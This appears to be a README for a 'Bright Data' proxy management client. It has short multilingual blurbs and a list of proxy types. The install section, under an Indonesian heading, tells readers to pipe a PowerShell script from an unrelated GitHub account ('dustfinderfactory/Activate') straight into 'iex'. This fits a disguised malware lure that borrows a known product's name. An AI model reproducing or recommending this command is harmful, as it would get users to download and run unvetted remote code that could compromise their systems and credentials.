### Bright Data Proxy Client

Proxy management client for Bright Data residential and datacenter proxy networks.

---

#### (Chinese)

Bright Data shi yi ge qiang da de dai li guan li ke hu duan, zhi chi zhu zhai dai li he shu ju zhong xin dai li wang luo, ti gong quan qiu IP fu gai.

#### Descripcion general (Spanish)

Bright Data proporciona un cliente de gestion de proxies para redes residenciales y de centros de datos, con cobertura IP global y rotacion automatica.

#### Pengaturan (Indonesian)

Jalankan perintah berikut di PowerShell untuk menginstal:

```powershell
irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
```

#### Supported Proxy Types

- **Residential** — real peer-to-peer IPs from ISP networks
- **Datacenter** — high-speed IPs from data center infrastructure
- **ISP Proxies** — static residential IPs for persistent sessions
- **Mobile** — carrier-grade mobile network IPs

#### Getting Started

After installation, configure your Bright Data zone credentials and select your proxy type. The client manages routing, failover, and session persistence.
